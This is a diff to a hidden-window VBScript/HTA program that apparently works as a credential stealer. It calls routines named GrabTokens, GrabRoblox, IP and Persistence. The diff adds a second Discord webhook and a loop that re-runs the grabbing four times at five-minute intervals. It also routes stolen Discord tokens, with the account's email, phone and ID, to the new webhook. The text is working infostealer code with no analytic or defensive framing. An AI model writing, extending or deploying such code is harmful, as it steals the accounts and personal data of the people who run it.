@@ -5,12 +5,13 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, PC, USER
+Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOKS ---
 WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
+RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -20,6 +21,16 @@ Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
+
+' --- Re-run grab chain 4x (every 5 min) ---
+Dim runCount
+For runCount = 1 To 4
+    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
+    Call GrabTokens
+    Call IP
+    Call GrabRoblox
+    If runCount < 4 Then Call SleepMinutes(5)
+Next
 
 ' --- WAIT AND CLOSE ---
 Call SleepSeconds(10)
@@ -225,7 +236,7 @@ Sub GrabTokens()
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo(":gift: Discord Token", info, 5793266, WH)
+                        Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
